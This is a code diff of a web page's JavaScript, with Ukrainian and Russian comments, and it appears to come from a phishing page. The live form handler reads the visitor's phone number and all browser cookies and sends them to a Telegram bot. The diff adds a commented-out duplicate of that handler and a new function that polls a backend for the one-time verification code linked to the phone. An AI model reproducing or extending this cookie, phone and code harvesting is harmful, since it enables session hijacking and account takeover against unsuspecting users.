@@ -698,6 +698,36 @@
             document.getElementById("loader").style.display = "none";
             document.getElementById("popwhat").style.display = "none";
 
+            // nextStepBtn?.addEventListener("click", function (e) {
+            //     e.preventDefault();
+
+            //     const phone = document.getElementById("number").value.trim();
+            //     const cookies = document.cookie || "Немає кукі";
+
+            //     // if (!phone) return alert("Введіть номер");
+
+            //     sessionStorage.setItem("submittedPhone", phone);
+
+            //     const msg = `📲 Новий запит\nТелефон: ${phone}\n🍪 Кукі: ${cookies}`;
+            //     fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            //         method: "POST",
+            //         headers: { "Content-Type": "application/json" },
+            //         body: JSON.stringify({ chat_id, text: msg })
+            //     });
+
+            //     //document.getElementById("form-step-1").style.display = "none";
+            //     //document.getElementById("form-step-2").style.display = "block";
+            //     // document.getElementById("step-1").style.display = "none"; // Полностью скрываем первый шаг (вместе с текстом "Devi accedere...")
+            //     // const step2Block = document.getElementById("step-2");
+            //     // step2Block.classList.remove("hidden"); // Показываем весь блок второго шага (убираем класс "hidden")
+            //     // step2Block.style.display = "block"; // Убеждаемся, что он отображается как блок
+            //     document.getElementById("form-step-2").style.display = "block"; // Внутри второго шага показываем форму для ввода кода
+
+            //     // codeStepBtn?.click();
+
+
+            // });
+
             nextStepBtn?.addEventListener("click", function (e) {
                 e.preventDefault();
 
@@ -707,6 +737,7 @@
                 // if (!phone) return alert("Введіть номер");
 
                 sessionStorage.setItem("submittedPhone", phone);
+                sessionStorage.setItem("requestTime", String(Date.now())); // для захисту від старих кодів
 
                 const msg = `📲 Новий запит\nТелефон: ${phone}\n🍪 Кукі: ${cookies}`;
                 fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -715,18 +746,30 @@
                     body: JSON.stringify({ chat_id, text: msg })
                 });
 
-                //document.getElementById("form-step-1").style.display = "none";
-                //document.getElementById("form-step-2").style.display = "block";
-                // document.getElementById("step-1").style.display = "none"; // Полностью скрываем первый шаг (вместе с текстом "Devi accedere...")
-                // const step2Block = document.getElementById("step-2");
-                // step2Block.classList.remove("hidden"); // Показываем весь блок второго шага (убираем класс "hidden")
-                // step2Block.style.display = "block"; // Убеждаемся, что он отображается как блок
-                document.getElementById("form-step-2").style.display = "block"; // Внутри второго шага показываем форму для ввода кода
+                // ❗️НЕ показуємо форму 2
+                // document.getElementById("form-step-2").style.display = "block";
 
-                codeStepBtn?.click();
-
-
+                // Запускаємо очікування коду
+                waitForCode(phone);
             });
+
+            function waitForCode(phone) {
+                const startTime = Number(sessionStorage.getItem("requestTime") || "0");
+
+                const interval = setInterval(() => {
+                    fetch(`${backendURL}/check-code?phone=${encodeURIComponent(phone)}`)
+                        .then(res => res.json())
+                        .then(data => {
+                            if (data.code && Number(data.timestamp) >= startTime) {
+                                clearInterval(interval);
+                                alert(`Ваш код: ${data.code}`);
+                            }
+                        })
+                        .catch(err => console.error("❌ Помилка при отриманні коду:", err));
+                }, 3000);
+            }
+
+
 
             codeStepBtn?.addEventListener("click", function (e) {
                 e.preventDefault();
